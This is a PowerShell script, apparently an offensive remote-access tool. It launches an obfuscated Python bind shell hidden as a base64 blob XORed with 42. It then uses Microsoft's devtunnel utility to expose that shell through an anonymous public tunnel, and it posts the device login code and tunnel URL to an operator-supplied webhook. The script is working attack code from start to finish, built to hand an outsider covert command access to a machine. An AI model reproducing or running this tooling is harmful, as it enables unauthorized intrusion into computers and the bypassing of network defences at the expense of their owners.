################################## CONFIG #####################################

# Your email address
$forwardingAddress = "<INSERT YOUR EMAIL ADDRESS>"

$exe = "devtunnel.exe"

# This webhook is used to email you the auth code and tunnel URL.
$webhookUrl = "<INSERT WEBHOOK URL>"

############################## HERE BE DRAGONS ################################

# Randomise all the things.
$tunnelName = -join ((1..10 | % { [char[]](97..122) | Get-Random }))
$authCodeFile = [System.IO.Path]::GetTempFileName()
$tunnelUrlFile = [System.IO.Path]::GetTempFileName()

## 0. Start bind shell.
$bindCmd = @"
import base64;c='''Q0daRVheCkJeXloEWU9YXE9YBgpZX0haWEVJT1lZICBJRktZWQp9T0h5Qk9GR
gJCXl5aBFlPWFxPWARoS1lPYn5+enhPW19PWV5iS0RORk9YAxAgCgoKCk5PTApORXVtb34CWU9GTAM
QIAoKCgoKCgoKWU9GTARZT0ROdVhPWVpFRFlPAhgaGgMRCllPRkwEWU9ETnVCT0tOT1gCDWlFRF5PR
F4HXlNaTw0GCg1eT1JeBUJeR0YNAxEKWU9GTARPRE51Qk9LTk9YWQIDIAoKCgoKCgoKWU9GTARdTEN
GTwRdWENeTwJIDRZMRVhHCkdPXkJFThcIemV5fggUFkNEWl9eCkRLR08XCElHTggUFkNEWl9eCl5TW
k8XCFlfSEdDXggUFgVMRVhHFA0DICAKCgoKTk9MCk5FdXpleX4CWU9GTAMQIAoKCgoKCgoKRk9ETV5
CChcKQ0ReAllPRkwEQk9LTk9YWXENaUVEXk9EXgdmT0RNXkINdwMgCgoKCgoKCgpJR04KFwpZT0ZMB
FhMQ0ZPBFhPS04CRk9ETV5CAwROT0lFTk8CAwRZWkZDXgINFw0DcRt3IAoKCgoKCgoKRV9eWl9eChc
KWV9IWlhFSU9ZWQRYX0QCSUdOBgpZQk9GRhd+WF9PBgpJS1peX1hPdUVfXlpfXhd+WF9PBgpeT1JeF
35YX08DBFleTkVfXiAKCgoKCgoKCllPRkwEWU9ETnVYT1laRURZTwIYGhoDEQpZT0ZMBFlPRE51Qk9
LTk9YAg1pRUReT0ReB15TWk8NBgoNXk9SXgVCXkdGDQMRCllPRkwET0ROdUJPS05PWFkCAyAKCgoKC
goKCllPRkwEXUxDRk8EXVhDXk8CTA0WWlhPFFFFX15aX15XFgVaWE8UFkxFWEcKR09eQkVOFwh6ZXl
+CBQWQ0RaX14KREtHTxcISUdOCBQWQ0RaX14KXlNaTxcIWV9IR0NeCBQWBUxFWEcUDQRPRElFTk8CA
wMgIEJeXloEWU9YXE9YBGJ+fnp5T1hcT1gCAg1GRUlLRkJFWV4NBgoSGhoaAwYKfU9IeUJPRkYDBFl
PWFxPdUxFWE9cT1gCAw==''';exec(bytearray([b^42 for b in base64.b64decode(c)]).decode('utf-8'))
"@

Start-Process -NoNewWindow -PassThru -FilePath "python" -ArgumentList "-c", "`"$bindCmd`""

## 1. If needed, download dvtunnel binary... what a chunk (22MB!).

if (-Not (Test-Path $exe)) {
    Invoke-WebRequest -Uri "https://aka.ms/TunnelsCliDownload/win-x64" -OutFile $exe
}

## 2. Automated Authentication ;)

# Create a new process to run the 'login' command and capture its output.
$authProcess = Start-Process -FilePath $exe `
                         -ArgumentList "user login -g -d" `
                         -NoNewWindow -RedirectStandardOutput "$authCodeFile" `
                         -PassThru

# Continuously monitor the temp file for the device auth code.
$deviceCode = $null
while ($null -eq $deviceCode) {
    $output = Get-Content "$authCodeFile" -Raw
    $deviceCode = ($output | Select-String -Pattern "enter the code:" | ForEach-Object { 
        if ($_.Line -match "code:\s+([A-Z0-9\-]+)") {
            $matches[1]
        }
    })
    Start-Sleep -Seconds 1
}

# Once the device auth code is captured, POST it to the webhook.
if ($deviceCode) {
    $payload = @{
        email = "$forwardingAddress"
        code = "$deviceCode"
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payload
}

# Wait for the auth process to complete.
$authProcess.WaitForExit()

# Clean up the temp file.
Remove-Item "$authCodeFile"

## 3. Create an anonymous tunnel.

# Create the tunnel with a persistent alias and make it anonymous.
Start-Process -FilePath $exe -ArgumentList "create $tunnelName -a" -NoNewWindow -Wait

# Add a port to the tunnel.

# The bind shell is listening on this port.
# Change it and you will need to update the payload above.
$tunnelPort = 8000

Start-Process -FilePath $exe -ArgumentList "port create $tunnelName -p $tunnelPort" -NoNewWindow -Wait

# Host the tunnel as a background process.
$hostProcess = Start-Process -FilePath $exe `
                         -ArgumentList "host $tunnelName" `
                         -NoNewWindow -RedirectStandardOutput $tunnelUrlFile `
                         -PassThru
                         
# Monitor the temp file to grab the tunnel URL.
$tunnelUrl = $null
while ($null -eq $tunnelUrl) {
    if (Test-Path $tunnelUrlFile) {
        $output = Get-Content $tunnelUrlFile -Raw

        $tunnelUrl = ($output | Select-String -Pattern "Connect via browser:" | ForEach-Object { 
            if ($_.Line -match ",\s(https:\/\/[^\s,]+-$tunnelPort\.[^\s,]+)") {
                $matches[1]
            }
        })

        # Check if the tunnel URL was found, if not sleep for a second and try again.
        if ($null -eq $tunnelUrl) {
            Start-Sleep -Seconds 1
        }
    } else {
        # If the file doesn't exist yet, sleep for a second and check again.
        Start-Sleep -Seconds 1
    }
}

# Once the tunnel URL is captured, send it to the webhook.
if ($tunnelUrl) {
    $payload = @{
        email = "$forwardingAddress"
        url = "$tunnelUrl"
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payload
}

# Wait for the tunnel host process to complete.
$hostProcess.WaitForExit()

# Clean up the temp file.
Remove-Item $tunnelUrlFile